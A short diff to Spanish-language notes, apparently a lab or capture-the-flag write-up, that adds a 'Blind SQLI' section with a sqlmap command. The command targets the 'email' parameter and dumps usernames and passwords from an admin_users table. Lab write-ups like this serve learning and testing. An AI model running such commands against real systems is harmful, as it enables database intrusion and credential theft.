@@ -57,5 +57,9 @@ sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin
 ![[Pasted image 20240415201751.png]]
 ###### con este ataque podemos determinar que es una blind sqli por lo cual el ataque puede tardar bastante. 
 
+### Blind SQLI
 
+```python
+sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C username,password --dump --threads 10
+```
 ![[Pasted image 20240418101705.png]]
